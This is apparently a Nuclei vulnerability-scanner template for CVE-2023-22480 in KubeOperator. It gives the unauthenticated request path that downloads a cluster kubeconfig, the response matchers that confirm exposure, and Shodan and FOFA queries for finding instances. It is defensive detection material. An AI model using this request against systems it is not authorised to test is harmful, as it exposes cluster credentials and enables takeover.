http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - 'apiVersion:'
    - 'clusters:'
  - part: header
    type: word
    words:
    - application/download
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/api/v1/clusters/kubeconfig/k8s'
id: CVE-2023-22480
info:
  author: DhiyaneshDk
  classification:
    cpe: cpe:2.3:a:fit2cloud:kubeoperator:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-22480
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-863,CWE-285
    epss-percentile: 0.87123
    epss-score: 0.01867
  description: 'KubeOperator is an open source Kubernetes distribution focused on
    helping enterprises plan, deploy and operate production-level K8s clusters. In
    KubeOperator versions 3.16.3 and below, API interfaces with unauthorized entities
    and can leak sensitive information. This vulnerability could be used to take over
    the cluster under certain conditions. This issue has been patched in version 3.16.4.

    '
  impact: 'An attacker can download sensitive files from the KubeOperator Foreground
    kubeconfig file, potentially leading to unauthorized access or exposure of sensitive
    information.

    '
  metadata:
    fofa-query: app="KubeOperator"
    max-request: 1
    product: kubeoperator
    shodan-query: html:"KubeOperator"
    vendor: fit2cloud
    verified: true
  name: KubeOperator Foreground `kubeconfig` - File Download
  reference:
  - https://github.com/KubeOperator/KubeOperator/security/advisories/GHSA-jxgp-jgh3-8jc8
  - https://github.com/PeiQi0/PeiQi-WIKI-Book/blob/main/docs/wiki/webapp/KubeOperator/KubeOperator%20kubeconfig%20%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E%20CVE-2023-22480.md?plain=1
  - https://nvd.nist.gov/vuln/detail/CVE-2023-22480
  - https://github.com/KubeOperator/KubeOperator/commit/7ef42bf1c16900d13e6376f8be5ecdbfdfb44aaf
  - https://github.com/KubeOperator/KubeOperator/releases/tag/v3.16.4
  remediation: 'Upgrade to the latest version to mitigate this vulnerability.

    '
  severity: critical
  tags: cve2023,cve,kubeoperator,k8s,kubeconfig,exposure,fit2cloud
